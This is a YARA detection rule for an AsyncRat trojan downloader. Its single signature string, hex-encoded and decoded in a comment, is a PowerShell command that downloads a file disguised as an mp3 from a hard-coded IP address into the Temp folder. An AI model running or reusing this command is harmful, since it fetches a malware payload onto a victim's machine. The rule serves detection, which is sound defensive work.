
rule TrojanDownloader_Win64_AsyncRat_CCJU_MTB{
	meta:
		description = "TrojanDownloader:Win64/AsyncRat.CCJU!MTB,SIGNATURE_TYPE_PEHSTR_EXT,02 00 02 00 01 00 00 "
		
	strings :
		$a_01_0 = {70 6f 77 65 72 73 68 65 6c 6c 28 6e 65 77 2d 6f 62 6a 65 63 74 20 53 79 73 74 65 6d 2e 4e 65 74 2e 57 65 62 43 6c 69 65 6e 74 29 2e 44 6f 77 6e 6c 6f 61 64 46 69 6c 65 28 27 68 74 74 70 3a 2f 2f 31 34 39 2e 38 38 2e 36 36 2e 36 38 2f 74 65 73 74 2e 6d 70 33 27 2c 27 25 54 65 6d 70 25 2f 74 65 73 74 2e 62 69 6e 27 29 } //2 powershell(new-object System.Net.WebClient).DownloadFile('http://149.88.66.68/test.mp3','%Temp%/test.bin')
	condition:
		((#a_01_0  & 1)*2) >=2
 
}